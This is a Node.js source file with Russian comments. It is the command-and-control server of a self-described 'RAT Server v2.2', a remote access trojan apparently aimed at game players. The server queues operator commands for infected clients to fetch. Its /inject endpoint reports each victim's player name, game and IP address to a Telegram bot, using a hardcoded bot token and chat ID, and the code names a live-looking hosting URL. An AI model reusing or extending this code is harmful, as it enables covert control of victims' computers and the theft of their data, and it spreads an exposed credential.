// server.js
const http = require('http');
const fetch = require('node-fetch');

// Хранилище данных
let commandQueue = [];
let lastScreenshot = null;
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Логирование
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    console.log(`[${timestamp}] ${action}: ${details}`);
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    if (req.method === 'POST' && req.url === '/client_command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args } = JSON.parse(body);
                logAction('КОМАНДА ОТ БОТА', `${command} ${args ? args.join(' ') : ''}`);
                
                // Добавляем команду в очередь
                commandQueue.push({
                    command: command,
                    args: args || [],
                    timestamp: new Date().toISOString(),
                    id: Math.random().toString(36).substr(2, 9)
                });

                // Ограничиваем размер очереди
                if (commandQueue.length > 20) {
                    commandQueue = commandQueue.slice(-20);
                }

                logAction('ОЧЕРЕДЬ', `Размер: ${commandQueue.length}`);
                
                res.end(JSON.stringify({ 
                    status: "OK", 
                    command: command,
                    queue_size: commandQueue.length 
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/get_command') {
        // Клиент запрашивает команду
        if (commandQueue.length > 0) {
            const command = commandQueue.shift(); // Берем первую команду из очереди
            logAction('ОТПРАВКА КЛИЕНТУ', command.command);
            res.end(JSON.stringify(command));
        } else {
            // Отправляем пустой ответ вместо ошибки
            res.end(JSON.stringify({ 
                command: "", 
                args: [],
                timestamp: new Date().toISOString()
            }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/inject') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, game, ip } = JSON.parse(body);
                logAction('ИНЖЕКТ', `Игрок: ${player}, Игра: ${game}`);
                
                const message = `🎮 <b>НОВОЕ ПОДКЛЮЧЕНИЕ</b>\n👤 Игрок: <code>${player}</code>\n🎯 Игра: <code>${game}</code>\n🌐 IP: <code>${ip || 'N/A'}</code>\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
                
                await sendToTelegram(message);
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/status') {
        res.end(JSON.stringify({ 
            status: "online", 
            version: "2.2",
            timestamp: new Date().toISOString(),
            queue_size: commandQueue.length,
            last_command: commandQueue.length > 0 ? commandQueue[commandQueue.length-1].command : "none"
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({ 
            message: "RAT Server v2.2 - Simplified",
            endpoints: [
                "POST /client_command - Команды от бота", 
                "GET /get_command - Получить команду для клиента",
                "POST /inject - Уведомление о инжекте",
                "GET /status - Статус сервера"
            ],
            queue_size: commandQueue.length
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: https://ratserver-6wo3.onrender.com`);
    
    sendToTelegram(`<b>🟢 СЕРВЕР ЗАПУЩЕН</b>\n📍 https://ratserver-6wo3.onrender.com\n⏰ ${new Date().toLocaleString('ru-RU')}`);
});
